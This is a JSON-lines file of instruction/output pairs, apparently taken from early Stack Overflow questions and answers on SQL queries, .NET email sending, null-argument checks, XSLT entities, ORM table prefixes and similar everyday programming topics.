{"instruction": "Source\n\nRegexOptions.IgnoreCase is more expensive than I would have thought (eg, should be barely measurable)\n\nAssuming that this applies to PHP, Python, Perl, Ruby etc as well as C# (which is what I assume Jeff was using), how much of a slowdown is it and will I incur a similar penalty with \"/[a-zA-z]/\" as I will with \"/[a-z]/i\" ?", "output": "If you're concerned about this, it may be worthwhile to set the case to all upper or all lower before you check.\nFor instance, in Perl:\n$x = \"abbCCDGBAdgfabv\";\n(lc $x) =~ /bad/;\n\nMay in some cases be better than\n$x = \"abbCCDGBAdgfabv\";\n$x =~ /bad/i;"}
{"instruction": "What is the best way to include an html entity in XSLT?\n<xsl:template match=\"/a/node\">\n    <xsl:value-of select=\".\"/>\n    <xsl:text>&nbsp;</xsl:text>\n</xsl:template>\n\nthis one returns a XsltParseError", "output": "Now that there's Unicode, it's generally counter-productive to use named character entities.  I would recommend using the Unicode character for a non-breaking space instead of an entity, just for that reason.  Alternatively, you could use the entity &#160;, instead of the named entity.  Using named entities makes your XML dependent on an inline or external DTD."}
{"instruction": "What is the simplest SQL query to find the second largest integer value in a specific column? \nThere are maybe duplicate values in the column.", "output": "In T-Sql there are two ways:\n--filter out the max\nselect max( col )\nfrom [table]\nwhere col < ( \n    select max( col )\n    from [table] )\n\n--sort top two then bottom one\nselect top 1 col \nfrom (\n    select top 2 col \n    from [table]\n    order by col) topTwo\norder by col desc \n\nIn Microsoft SQL the first way is twice as fast as the second, even if the column in question is clustered.\nThis is because the sort operation is relatively slow compared to the table or index scan that the max aggregation uses.\nAlternatively, in Microsoft SQL 2005 and above you can use the ROW_NUMBER() function:\nselect col\nfrom (\n    select ROW_NUMBER() over (order by col asc) as 'rowNum', col\n    from [table] ) withRowNum \nwhere rowNum = 2"}
{"instruction": "I'm building a RESTful web service which has multiple URIs for one of its resources, because there is more than one unique identifier. Should the server respond to a GET request for an alternate URI by returning the resource, or should I send an HTTP 3xx redirect to the canonical URI? Is HTTP 303 (see also) the most appropriate redirect?\nClarification: the HTTP specification makes it clear that the choice of redirect depends on which URI future requests should use. In my application, the 'canonical' URI is the most stable of the alternatives; an alternative URI will always direct to same canonical URI, or become invalid.", "output": "The answer from Ubiguchi had what I needed, except that I now think a redirect is the way to go, via the link to the HTTP 1.1 specifiction section on response codes. It turns out that I actually need a 301 redirect because the URI I'm redirecting to is more 'correct' and stable, and should therefore be used for future requests."}
{"instruction": "I've developed my own delivery extension for Reporting Services 2005, to integrate this with our SaaS marketing solution.\nIt takes the subscription, and takes a snapshot of the report with a custom set of parameters. It then renders the report, sends an e-mail with a link and the report attached as XLS.\nEverything works fine, until mail delivery...\nHere's my code for sending e-mail:\n public static List<string> SendMail(SubscriptionData data, Stream reportStream, string reportName, string smptServerHostname, int smtpServerPort)\n{\n  List<string> failedRecipients = new List<string>();\n\n  MailMessage emailMessage = new MailMessage(data.ReplyTo, data.To);\n  emailMessage.Priority = data.Priority;\n  emailMessage.Subject = data.Subject;\n  emailMessage.IsBodyHtml = false;\n  emailMessage.Body = data.Comment;\n\n  if (reportStream != null)\n  {\n    Attachment reportAttachment = new Attachment(reportStream, reportName);\n    emailMessage.Attachments.Add(reportAttachment);\n    reportStream.Dispose();\n  }\n\n  try\n  {\n    SmtpClient smtp = new SmtpClient(smptServerHostname, smtpServerPort);\n\n    // Send the MailMessage\n    smtp.Send(emailMessage);\n  }\n  catch (SmtpFailedRecipientsException ex)\n  {\n    // Delivery failed for the recipient. Add the e-mail address to the failedRecipients List\n    failedRecipients.Add(ex.FailedRecipient);\n  }\n  catch (SmtpFailedRecipientException ex)\n  {\n    // Delivery failed for the recipient. Add the e-mail address to the failedRecipients List\n    failedRecipients.Add(ex.FailedRecipient);\n  }\n  catch (SmtpException ex)\n  {\n    throw ex;\n  }\n  catch (Exception ex)\n  {\n    throw ex;\n  }\n\n  // Return the List of failed recipient e-mail addresses, so the client can maintain its list.\n  return failedRecipients;\n}\n\nValues for SmtpServerHostname is localhost, and port is 25.\nI veryfied that I can actually send mail, by using Telnet. And it works.\nHere's the error message I get from SSRS:\nReportingServicesService!notification!4!08/28/2008-11:26:17:: Notification 6ab32b8d-296e-47a2-8d96-09e81222985c completed.  Success: False, Status: Exception Message: Failure sending mail. Stacktrace:    at MyDeliveryExtension.MailDelivery.SendMail(SubscriptionData data, Stream reportStream, String reportName, String smptServerHostname, Int32 smtpServerPort) in C:\\inetpub\\wwwroot\\CustomReporting\\MyDeliveryExtension\\MailDelivery.cs:line 48\n   at MyDeliveryExtension.MyDelivery.Deliver(Notification notification) in C:\\inetpub\\wwwroot\\CustomReporting\\MyDeliveryExtension\\MyDelivery.cs:line 153, DeliveryExtension: My Delivery, Report: Clicks Development, Attempt 1\nReportingServicesService!dbpolling!4!08/28/2008-11:26:17:: NotificationPolling finished processing item 6ab32b8d-296e-47a2-8d96-09e81222985c\nCould this have something to do with Trust/Code Access Security?\nMy delivery extension is granted full trust in rssrvpolicy.config:\n   <CodeGroup \n    class=\"UnionCodeGroup\"\n    version=\"1\"\n    PermissionSetName=\"FullTrust\"\n    Name=\"MyDelivery_CodeGroup\"\n    Description=\"Code group for MyDelivery extension\">\n    <IMembershipCondition class=\"UrlMembershipCondition\" version=\"1\" Url=\"C:\\Program Files\\Microsoft SQL Server\\MSSQL.2\\Reporting Services\\ReportServer\\bin\\MyDeliveryExtension.dll\" />\n   </CodeGroup>\n\nCould trust be an issue here?\nAnother theory: SQL Server and SSRS was installed in the security context of Local System. Am I right, or is this service account restricted access to any network resource? Even its own SMTP Server?\nI tried changing all SQL Server Services logons to Administrator - but still without any success.\nI also tried logging onto the SMTP server in my code, by proviiding: NetworkCredential(\"Administrator\", \"password\") and also NetworkCredential(\"Administrator\", \"password\", \"MyRepServer\")\nCan anyone help here, please?", "output": "I tried to remove the reportStream Attachment:\n  //if (reportStream != null)    \n     //emailMessage.Attachments.Add(new Attachment(reportStream, reportName));\n\nAnd now it works fine.\nSo it is something to do with the reportStream."}
{"instruction": "What is the simplest SQL query to find the second largest integer value in a specific column? \nThere are maybe duplicate values in the column.", "output": "See http://stackoverflow.com/questions/16568.\nSybase SQL Anywhere supports:\nSELECT TOP 1 START AT 2 value from table ORDER BY value"}
{"instruction": "Instead of relying on my host to send email, I was thinking of sending the messages though my Gmail account. The emails are personalized emails to the bands I play on my show. Is it possible to do?", "output": "http://www.systemnetmail.com/ is probably the most absurdly complete site dedicated to a single .NET namespace...but it has EVERYTHING you could ever want to know about sending mail via .NET, be it ASP.NET or Desktop.\nhttp://www.systemwebmail.com/ was the original URL in the post, but should not be used for .NET 2.0 and above."}
{"instruction": "I am in the middle of reading the excellent Clean Code\nOne discussion is regarding passing nulls into a method.\npublic class MetricsCalculator {\n    public double xProjection(Point p1, Point p2) {\n        return (p2.x - p1.x) * 1.5;\n    }\n}\n...\ncalculator.xProjection(null, new Point(12,13));\n\nIt represents different ways of handling this:\npublic double xProjection(Point p1, Point p2) {\n    if (p1 == null || p2 == null) {\n        throw new IllegalArgumentException(\"Invalid argument for xProjection\");\n    }\n    return (p2.x - p1.x) * 1.5;\n}\n\npublic double xProjection(Point p1, Point p2) {\n    assert p1 != null : \"p1 should not be null\";\n    assert p2 != null : \"p2 should not be null\";\n    return (p2.x - p1.x) * 1.5;\n}\n\nI prefer the assertions approach, but I don't like the fact that assertions are turned off by default.\nThe book finally states:\n\nIn most programming languages there is no good way to deal with a null that is passed by a caller accidentally. Because this is the case, the rational approach is to forbid passing null by default.\n\nIt doesn't really go into how you would enforce this restriction?\nDo any of you have strong opinions either way.", "output": "I generally prefer not doing either, since it's just slowing things down. NullPointerExceptions are thrown later on anyway, which will quickly lead the user to discovering they're passing null to the method. I used to check, but 40% of my code ended up being checking code, at which point I decided it was just not worth the nice assertion messages."}
{"instruction": "I am in the middle of reading the excellent Clean Code\nOne discussion is regarding passing nulls into a method.\npublic class MetricsCalculator {\n    public double xProjection(Point p1, Point p2) {\n        return (p2.x - p1.x) * 1.5;\n    }\n}\n...\ncalculator.xProjection(null, new Point(12,13));\n\nIt represents different ways of handling this:\npublic double xProjection(Point p1, Point p2) {\n    if (p1 == null || p2 == null) {\n        throw new IllegalArgumentException(\"Invalid argument for xProjection\");\n    }\n    return (p2.x - p1.x) * 1.5;\n}\n\npublic double xProjection(Point p1, Point p2) {\n    assert p1 != null : \"p1 should not be null\";\n    assert p2 != null : \"p2 should not be null\";\n    return (p2.x - p1.x) * 1.5;\n}\n\nI prefer the assertions approach, but I don't like the fact that assertions are turned off by default.\nThe book finally states:\n\nIn most programming languages there is no good way to deal with a null that is passed by a caller accidentally. Because this is the case, the rational approach is to forbid passing null by default.\n\nIt doesn't really go into how you would enforce this restriction?\nDo any of you have strong opinions either way.", "output": "It doesn't really go into how you would enforce this restriction?\n\nYou enforce it by throwing an ArgumentExcexception if they pass in null.\nif (p1 == null || p2 == null) {\n    throw new ArgumentExcexception(\"Invalid argument for xProjection\");\n}"}
{"instruction": "I am in the middle of reading the excellent Clean Code\nOne discussion is regarding passing nulls into a method.\npublic class MetricsCalculator {\n    public double xProjection(Point p1, Point p2) {\n        return (p2.x - p1.x) * 1.5;\n    }\n}\n...\ncalculator.xProjection(null, new Point(12,13));\n\nIt represents different ways of handling this:\npublic double xProjection(Point p1, Point p2) {\n    if (p1 == null || p2 == null) {\n        throw new IllegalArgumentException(\"Invalid argument for xProjection\");\n    }\n    return (p2.x - p1.x) * 1.5;\n}\n\npublic double xProjection(Point p1, Point p2) {\n    assert p1 != null : \"p1 should not be null\";\n    assert p2 != null : \"p2 should not be null\";\n    return (p2.x - p1.x) * 1.5;\n}\n\nI prefer the assertions approach, but I don't like the fact that assertions are turned off by default.\nThe book finally states:\n\nIn most programming languages there is no good way to deal with a null that is passed by a caller accidentally. Because this is the case, the rational approach is to forbid passing null by default.\n\nIt doesn't really go into how you would enforce this restriction?\nDo any of you have strong opinions either way.", "output": "I agree or disagree with wvdschel's post, it depends on what he's specifically saying.\nIn this case, sure, this method will crash on null so the explicit check here is probably not needed.\nHowever, if the method simply stores the passed data, and there is some other method that you call later that will deal with it, discovering bad input as early as possible is the key to fixing bugs faster. At that later point, there could be a myriad of ways that bad data happened to be given to your class. It's sort of trying to figure out how the rats came into your house after the fact, trying to find the hole somewhere."}
{"instruction": "I am in the middle of reading the excellent Clean Code\nOne discussion is regarding passing nulls into a method.\npublic class MetricsCalculator {\n    public double xProjection(Point p1, Point p2) {\n        return (p2.x - p1.x) * 1.5;\n    }\n}\n...\ncalculator.xProjection(null, new Point(12,13));\n\nIt represents different ways of handling this:\npublic double xProjection(Point p1, Point p2) {\n    if (p1 == null || p2 == null) {\n        throw new IllegalArgumentException(\"Invalid argument for xProjection\");\n    }\n    return (p2.x - p1.x) * 1.5;\n}\n\npublic double xProjection(Point p1, Point p2) {\n    assert p1 != null : \"p1 should not be null\";\n    assert p2 != null : \"p2 should not be null\";\n    return (p2.x - p1.x) * 1.5;\n}\n\nI prefer the assertions approach, but I don't like the fact that assertions are turned off by default.\nThe book finally states:\n\nIn most programming languages there is no good way to deal with a null that is passed by a caller accidentally. Because this is the case, the rational approach is to forbid passing null by default.\n\nIt doesn't really go into how you would enforce this restriction?\nDo any of you have strong opinions either way.", "output": "I prefer the use of assertions. \nI have a rule that I only use assertions in public and protected methods. This is because I believe the calling method should ensure that it is passing valid arguments to private methods."}
{"instruction": "I am in the middle of reading the excellent Clean Code\nOne discussion is regarding passing nulls into a method.\npublic class MetricsCalculator {\n    public double xProjection(Point p1, Point p2) {\n        return (p2.x - p1.x) * 1.5;\n    }\n}\n...\ncalculator.xProjection(null, new Point(12,13));\n\nIt represents different ways of handling this:\npublic double xProjection(Point p1, Point p2) {\n    if (p1 == null || p2 == null) {\n        throw new IllegalArgumentException(\"Invalid argument for xProjection\");\n    }\n    return (p2.x - p1.x) * 1.5;\n}\n\npublic double xProjection(Point p1, Point p2) {\n    assert p1 != null : \"p1 should not be null\";\n    assert p2 != null : \"p2 should not be null\";\n    return (p2.x - p1.x) * 1.5;\n}\n\nI prefer the assertions approach, but I don't like the fact that assertions are turned off by default.\nThe book finally states:\n\nIn most programming languages there is no good way to deal with a null that is passed by a caller accidentally. Because this is the case, the rational approach is to forbid passing null by default.\n\nIt doesn't really go into how you would enforce this restriction?\nDo any of you have strong opinions either way.", "output": "General rule is if your method doesn't expect null arguments then you should throw System.ArgumentNullException. Throwing proper exception not only protects you from resource corruption and other bad things but serves as a guide for users of your code saving time spent debugging your code.\nAlso read an article on Defensive programming"}
{"instruction": "I am in the middle of reading the excellent Clean Code\nOne discussion is regarding passing nulls into a method.\npublic class MetricsCalculator {\n    public double xProjection(Point p1, Point p2) {\n        return (p2.x - p1.x) * 1.5;\n    }\n}\n...\ncalculator.xProjection(null, new Point(12,13));\n\nIt represents different ways of handling this:\npublic double xProjection(Point p1, Point p2) {\n    if (p1 == null || p2 == null) {\n        throw new IllegalArgumentException(\"Invalid argument for xProjection\");\n    }\n    return (p2.x - p1.x) * 1.5;\n}\n\npublic double xProjection(Point p1, Point p2) {\n    assert p1 != null : \"p1 should not be null\";\n    assert p2 != null : \"p2 should not be null\";\n    return (p2.x - p1.x) * 1.5;\n}\n\nI prefer the assertions approach, but I don't like the fact that assertions are turned off by default.\nThe book finally states:\n\nIn most programming languages there is no good way to deal with a null that is passed by a caller accidentally. Because this is the case, the rational approach is to forbid passing null by default.\n\nIt doesn't really go into how you would enforce this restriction?\nDo any of you have strong opinions either way.", "output": "@Chris Karcher I would say absolutely correct. The only thing I would say is check the params separately and have the exeption report the param that was null also as it makes tracking where the null is coming from much easier.\n@wvdschel wow! If writing the code is too much effort for you, you should look into something like PostSharp (or a Java equivalent if one is available) which can post-process your assemblies and insert param checks for you."}
{"instruction": "Instead of relying on my host to send email, I was thinking of sending the messages though my Gmail account. The emails are personalized emails to the bands I play on my show. Is it possible to do?", "output": "Be sure to use System.Net.Mail, not the deprecated System.Web.Mail. Doing SSL with System.Web.Mail is a gross mess of hacky extensions.\nusing System.Net;\nusing System.Net.Mail;\n\nvar fromAddress = new MailAddress(\"from@gmail.com\", \"From Name\");\nvar toAddress = new MailAddress(\"to@example.com\", \"To Name\");\nconst string fromPassword = \"fromPassword\";\nconst string subject = \"Subject\";\nconst string body = \"Body\";\n\nvar smtp = new SmtpClient\n{\n    Host = \"smtp.gmail.com\",\n    Port = 587,\n    EnableSsl = true,\n    DeliveryMethod = SmtpDeliveryMethod.Network,\n    UseDefaultCredentials = false,\n    Credentials = new NetworkCredential(fromAddress.Address, fromPassword)\n};\nusing (var message = new MailMessage(fromAddress, toAddress)\n{\n    Subject = subject,\n    Body = body\n})\n{\n    smtp.Send(message);\n}"}
{"instruction": "I am in the middle of reading the excellent Clean Code\nOne discussion is regarding passing nulls into a method.\npublic class MetricsCalculator {\n    public double xProjection(Point p1, Point p2) {\n        return (p2.x - p1.x) * 1.5;\n    }\n}\n...\ncalculator.xProjection(null, new Point(12,13));\n\nIt represents different ways of handling this:\npublic double xProjection(Point p1, Point p2) {\n    if (p1 == null || p2 == null) {\n        throw new IllegalArgumentException(\"Invalid argument for xProjection\");\n    }\n    return (p2.x - p1.x) * 1.5;\n}\n\npublic double xProjection(Point p1, Point p2) {\n    assert p1 != null : \"p1 should not be null\";\n    assert p2 != null : \"p2 should not be null\";\n    return (p2.x - p1.x) * 1.5;\n}\n\nI prefer the assertions approach, but I don't like the fact that assertions are turned off by default.\nThe book finally states:\n\nIn most programming languages there is no good way to deal with a null that is passed by a caller accidentally. Because this is the case, the rational approach is to forbid passing null by default.\n\nIt doesn't really go into how you would enforce this restriction?\nDo any of you have strong opinions either way.", "output": "@lassevk:\n\nHowever, if the method simply stores the passed data, and there is some other method that you call later that will deal with it, discovering bad input as early as possible is the key to fixing bugs faster. At that later point, there could be a myriad of ways that bad data happened to be given to your class. It's sort of trying to figure out how the rats came into your house after the fact, trying to find the hole somewhere.\n\nYou're right about that, these checks should only be enforced when data is only stored to be processed or used later, I didn't think of that scenario.\n@Shaun Austin:\n\nwow! If writing the code is too much effort for you, ...\n\nWriting code is not the problem, writing monkey code that bothers me. Writing code that a machine could have written better. That library looks like it does just that, thanks for pointing it out!"}
{"instruction": "I have some C# / asp.net code I inherited which has a textbox which I want to make multiline. I did so by adding textmode=\"multiline\" but when I try to insert a newline, the enter key instead submits the form :P\nI googled around and it seems like the default behavior should be for enter (or control-enter) to insert a newline. Like I said I inherited the code so I'm not sure if there's javascript monkeying around or if there's just a simple asp.net thing I have to do.", "output": "It turns out this is a bug with Firefox + ASP.NET where the generated javascript for the defaultButton stuff doesn't work in Firefox. I had to put a replacement for the WebForm_FireDefatultButton function as described here:\nfunction WebForm_FireDefaultButton(event, target) {\n    var element = event.target || event.srcElement;\n    if (event.keyCode == 13 &&\n    !(element &&\n    element.tagName.toLowerCase() == \"textarea\"))\n    {\n        var defaultButton;\n        if (__nonMSDOMBrowser)\n        {\n            defaultButton = document.getElementById(target);\n        }\n        else\n        {\n            defaultButton = document.all[target];\n        }\n        if (defaultButton && typeof defaultButton.click != \"undefined\")\n        {\n            defaultButton.click();\n            event.cancelBubble = true;\n            if (event.stopPropagation)\n            {\n                event.stopPropagation();\n            }\n            return false;\n        }\n    }\n    return true;\n}"}
{"instruction": "How do you specify that a foreign key constraint should be a 1:1 relationship in transact sql? Is declaring the column UNIQUE enough? Below is my existing code.!\nCREATE TABLE [dbo].MyTable(\n    [MyTablekey] INT IDENTITY(1,1) NOT FOR REPLICATION NOT NULL,\n    [OtherTableKey] INT NOT NULL UNIQUE\n        CONSTRAINT [FK_MyTable_OtherTable] FOREIGN KEY REFERENCES [dbo].[OtherTable]([OtherTableKey]),\n    ...\n    CONSTRAINT [PK_MyTable] PRIMARY KEY CLUSTERED \n    (\n        [MyTableKey] ASC\n    ) WITH (PAD_INDEX  = OFF, STATISTICS_NORECOMPUTE  = OFF, IGNORE_DUP_KEY = OFF, ALLOW_ROW_LOCKS  = ON, ALLOW_PAGE_LOCKS  = ON) ON [PRIMARY]\n) ON [PRIMARY]\nGO", "output": "You could declare the column to be both the primary key and a foreign key.  This is a good strategy for \"extension\" tables that are used to avoid putting nullable columns into the main table."}
{"instruction": "How do you specify that a foreign key constraint should be a 1:1 relationship in transact sql? Is declaring the column UNIQUE enough? Below is my existing code.!\nCREATE TABLE [dbo].MyTable(\n    [MyTablekey] INT IDENTITY(1,1) NOT FOR REPLICATION NOT NULL,\n    [OtherTableKey] INT NOT NULL UNIQUE\n        CONSTRAINT [FK_MyTable_OtherTable] FOREIGN KEY REFERENCES [dbo].[OtherTable]([OtherTableKey]),\n    ...\n    CONSTRAINT [PK_MyTable] PRIMARY KEY CLUSTERED \n    (\n        [MyTableKey] ASC\n    ) WITH (PAD_INDEX  = OFF, STATISTICS_NORECOMPUTE  = OFF, IGNORE_DUP_KEY = OFF, ALLOW_ROW_LOCKS  = ON, ALLOW_PAGE_LOCKS  = ON) ON [PRIMARY]\n) ON [PRIMARY]\nGO", "output": "Based on your code above, the unique constraint would be enough given that the for every primary key you have in the table, the unique constrained column is also unique.  Also, this assumes that in [OtherTable], the [OtherTableKey] column is the primary key of that table."}
{"instruction": "I am in the middle of reading the excellent Clean Code\nOne discussion is regarding passing nulls into a method.\npublic class MetricsCalculator {\n    public double xProjection(Point p1, Point p2) {\n        return (p2.x - p1.x) * 1.5;\n    }\n}\n...\ncalculator.xProjection(null, new Point(12,13));\n\nIt represents different ways of handling this:\npublic double xProjection(Point p1, Point p2) {\n    if (p1 == null || p2 == null) {\n        throw new IllegalArgumentException(\"Invalid argument for xProjection\");\n    }\n    return (p2.x - p1.x) * 1.5;\n}\n\npublic double xProjection(Point p1, Point p2) {\n    assert p1 != null : \"p1 should not be null\";\n    assert p2 != null : \"p2 should not be null\";\n    return (p2.x - p1.x) * 1.5;\n}\n\nI prefer the assertions approach, but I don't like the fact that assertions are turned off by default.\nThe book finally states:\n\nIn most programming languages there is no good way to deal with a null that is passed by a caller accidentally. Because this is the case, the rational approach is to forbid passing null by default.\n\nIt doesn't really go into how you would enforce this restriction?\nDo any of you have strong opinions either way.", "output": "Although it is not strictly related you might want to take a look to Spec#.\nI think it is still in development (by Microsoft) but some CTP are available and it looks promising. Basically it allows you to do this:\n  public static int Divide(int x, int y)\n    requires y != 0 otherwise ArgumentException; \n  {\n  }\n\nor\n  public static int Subtract(int x, int y)\n    requires x > y;\n    ensures result > y;\n  {\n    return x - y;\n  }\n\nIt also provides another features like Notnull types. It's build on top of the .NET Framework 2.0 and it's fully compatible. The syntaxt, as you may see, is C#."}
{"instruction": "What is the simplest SQL query to find the second largest integer value in a specific column? \nThere are maybe duplicate values in the column.", "output": "I see both some SQL Server specific and some MySQL specific solutions here, so you might want to clarify which database you need.  Though if I had to guess I'd say SQL Server since this is trivial in MySQL.\nI also see some solutions that won't work because they fail to take into account the possibility for duplicates, so be careful which ones you accept.  Finally, I see a few that will work but that will make two complete scans of the table.  You want to make sure the 2nd scan is only looking at 2 values.\nSQL Server (pre-2012):\nSELECT MIN([column]) AS [column]\nFROM (\n    SELECT TOP 2 [column] \n    FROM [Table] \n    GROUP BY [column] \n    ORDER BY [column] DESC\n) a\n\nMySQL:\nSELECT `column` \nFROM `table` \nGROUP BY `column` \nORDER BY `column` \nDESC LIMIT 1,1\n\nUpdate:\nSQL Server 2012 now supports a much cleaner (and standard) OFFSET/FETCH syntax:\nSELECT TOP 2 [column] \nFROM [Table] \nGROUP BY [column] \nORDER BY [column] DESC\nOFFSET 1 ROWS\nFETCH NEXT 1 ROWS ONLY;"}
{"instruction": "How do you specify that a foreign key constraint should be a 1:1 relationship in transact sql? Is declaring the column UNIQUE enough? Below is my existing code.!\nCREATE TABLE [dbo].MyTable(\n    [MyTablekey] INT IDENTITY(1,1) NOT FOR REPLICATION NOT NULL,\n    [OtherTableKey] INT NOT NULL UNIQUE\n        CONSTRAINT [FK_MyTable_OtherTable] FOREIGN KEY REFERENCES [dbo].[OtherTable]([OtherTableKey]),\n    ...\n    CONSTRAINT [PK_MyTable] PRIMARY KEY CLUSTERED \n    (\n        [MyTableKey] ASC\n    ) WITH (PAD_INDEX  = OFF, STATISTICS_NORECOMPUTE  = OFF, IGNORE_DUP_KEY = OFF, ALLOW_ROW_LOCKS  = ON, ALLOW_PAGE_LOCKS  = ON) ON [PRIMARY]\n) ON [PRIMARY]\nGO", "output": "A foreign key column with the UNIQUE and NOT NULL constraints that references a UNIQUE, NOT NULL column in another table creates a 1:(0|1) relationship, which is probably what you want.\nIf there was a true 1:1 relationship, every record in the first table would have a corresponding record in the second table and vice-versa. In that case, you would probably just want to make one table (unless you needed some strange storage optimization)."}
{"instruction": "I've developed my own delivery extension for Reporting Services 2005, to integrate this with our SaaS marketing solution.\nIt takes the subscription, and takes a snapshot of the report with a custom set of parameters. It then renders the report, sends an e-mail with a link and the report attached as XLS.\nEverything works fine, until mail delivery...\nHere's my code for sending e-mail:\n public static List<string> SendMail(SubscriptionData data, Stream reportStream, string reportName, string smptServerHostname, int smtpServerPort)\n{\n  List<string> failedRecipients = new List<string>();\n\n  MailMessage emailMessage = new MailMessage(data.ReplyTo, data.To);\n  emailMessage.Priority = data.Priority;\n  emailMessage.Subject = data.Subject;\n  emailMessage.IsBodyHtml = false;\n  emailMessage.Body = data.Comment;\n\n  if (reportStream != null)\n  {\n    Attachment reportAttachment = new Attachment(reportStream, reportName);\n    emailMessage.Attachments.Add(reportAttachment);\n    reportStream.Dispose();\n  }\n\n  try\n  {\n    SmtpClient smtp = new SmtpClient(smptServerHostname, smtpServerPort);\n\n    // Send the MailMessage\n    smtp.Send(emailMessage);\n  }\n  catch (SmtpFailedRecipientsException ex)\n  {\n    // Delivery failed for the recipient. Add the e-mail address to the failedRecipients List\n    failedRecipients.Add(ex.FailedRecipient);\n  }\n  catch (SmtpFailedRecipientException ex)\n  {\n    // Delivery failed for the recipient. Add the e-mail address to the failedRecipients List\n    failedRecipients.Add(ex.FailedRecipient);\n  }\n  catch (SmtpException ex)\n  {\n    throw ex;\n  }\n  catch (Exception ex)\n  {\n    throw ex;\n  }\n\n  // Return the List of failed recipient e-mail addresses, so the client can maintain its list.\n  return failedRecipients;\n}\n\nValues for SmtpServerHostname is localhost, and port is 25.\nI veryfied that I can actually send mail, by using Telnet. And it works.\nHere's the error message I get from SSRS:\nReportingServicesService!notification!4!08/28/2008-11:26:17:: Notification 6ab32b8d-296e-47a2-8d96-09e81222985c completed.  Success: False, Status: Exception Message: Failure sending mail. Stacktrace:    at MyDeliveryExtension.MailDelivery.SendMail(SubscriptionData data, Stream reportStream, String reportName, String smptServerHostname, Int32 smtpServerPort) in C:\\inetpub\\wwwroot\\CustomReporting\\MyDeliveryExtension\\MailDelivery.cs:line 48\n   at MyDeliveryExtension.MyDelivery.Deliver(Notification notification) in C:\\inetpub\\wwwroot\\CustomReporting\\MyDeliveryExtension\\MyDelivery.cs:line 153, DeliveryExtension: My Delivery, Report: Clicks Development, Attempt 1\nReportingServicesService!dbpolling!4!08/28/2008-11:26:17:: NotificationPolling finished processing item 6ab32b8d-296e-47a2-8d96-09e81222985c\nCould this have something to do with Trust/Code Access Security?\nMy delivery extension is granted full trust in rssrvpolicy.config:\n   <CodeGroup \n    class=\"UnionCodeGroup\"\n    version=\"1\"\n    PermissionSetName=\"FullTrust\"\n    Name=\"MyDelivery_CodeGroup\"\n    Description=\"Code group for MyDelivery extension\">\n    <IMembershipCondition class=\"UrlMembershipCondition\" version=\"1\" Url=\"C:\\Program Files\\Microsoft SQL Server\\MSSQL.2\\Reporting Services\\ReportServer\\bin\\MyDeliveryExtension.dll\" />\n   </CodeGroup>\n\nCould trust be an issue here?\nAnother theory: SQL Server and SSRS was installed in the security context of Local System. Am I right, or is this service account restricted access to any network resource? Even its own SMTP Server?\nI tried changing all SQL Server Services logons to Administrator - but still without any success.\nI also tried logging onto the SMTP server in my code, by proviiding: NetworkCredential(\"Administrator\", \"password\") and also NetworkCredential(\"Administrator\", \"password\", \"MyRepServer\")\nCan anyone help here, please?", "output": "After fooling around with the tunctionallity that gets the reportStream, I was able to fix the mail sending problem.\nThe error wasn't in the SendMail method, but somewehere else. The exception was thrown in the context, of SendMail though. Buggered!"}
{"instruction": "I can connect with the DataContext to the Oracle database however I get errors in running the query against the oracle database.  I looked at the SQL generated and it is for MSSQL and not Oracle PSQL.  \nDoes anybody know of a decent easy to use wrapper to use LINQ against an Oracle Database?", "output": "We use the OraDirect driver from Devart. It includes ADO.NET Entity framework support. You can download a trial version here. You may then use LINQ to entities or entity SQL on top of this.\nThe pricing of this is quite developer friendly, you pay per developer seat and you may use it however you like.  \nAnother big advantage of this driver is that you can use it without installing an Oracle client, this is a big plus and worth the price alone.\n@Greg: We evaluated the datadirect drivers as well, but the performance was poor and  cost astronomical.\nEdit: It seems DevArt announced a beta with  LINQ support recently"}
{"instruction": "In a web application like wiki or forums or blogging software, it is often useful to store your data in a relational database. Since many hosting companies offer a single database with their hosting plans (with additional databases costing extra) it is very useful for your users when your database objects (tables, views, constraints, and stored procedures) have a common prefix. It is typical for applications aware of database scarcity to have a hard-coded table prefix. I want more, however. Specifically, I'd like to have a table prefix that users can designate\u2014say in the web.config file (with an appropriate default, of course).\nSince I hate coding CRUD operations by hand, I prefer to work through a competent OR/M and have used (and enjoyed) LINQ to SQL, Subsonic, and ADO.Net. I'm having some thrash in a new project, however, when it comes to putting a table prefix in a user's web.config file. Are there any .Net-based OR/M products that can handle this scenario elegantly?\nThe best I have been able to come up with so far is using LINQ to SQL with an external mapping file that I'd have to update somehow based on an as-yet hypothetical web.config setting.\nAnyone have a better solution? I tried to make it happen in Entity Framework, but that turned into a mess quickly. (Due to my unfamiliarity with EF? Possibly.) How about SubSonic? Does it have an option to apply a table prefix besides at code generation time?", "output": "I've now researched what it takes to do this in both Entity Framework and LINQ to SQL and documented the steps required in each. It's much longer than answers here tend to be so I'll be content with a link to the answer rather than duplicate it here. It's relatively involved for each, but the LINQ to SQL is the more flexible solution and also the easiest to implment."}
{"instruction": "Here's the situation:  I need to bind a WPF FixedPage against a DataRow.  Bindings don't work against DataRows; they work against DataRowViews.  I need to do this in the most generic way possible, as I know nothing about and have no control over what is in the DataRow.  \nWhat I need is to be able to get a DataRowView for a given DataRow.  I can't use the Find() method on the DefaultView because that takes a key, and there is no guarantee the table will have a primary key set.\nDoes anybody have a suggestion as to the best way to go around this?", "output": "row.Table.DefaultView[row.Table.Rows.IndexOf(row)]\n\nThis is an okay answer.  But if you find yourself in this situation, you should consider learning more about DataViews and how they are used, then refactor your code to be view-centric rather than table-centric."}
{"instruction": "I'm basically trying to figure out the simplest way to perform your basic insert operation in C#.NET using the SqlClient namespace. \nI'm using SqlConnection for my db link, I've already had success executing some reads, and I want to know the simplest way to insert data. I'm finding what seem to be pretty verbose methods when I google.", "output": "Since you seem to be just getting started with this now is the best time to familiarize yourself with the concept of a Data Access Layer (obligatory wikipedia link).  It will be very helpful for you down the road when you're apps have more interaction with the database throughout and you want to minimize code duplication.  Also makes for more consistent behavior, making testing and tons of other things easier."}
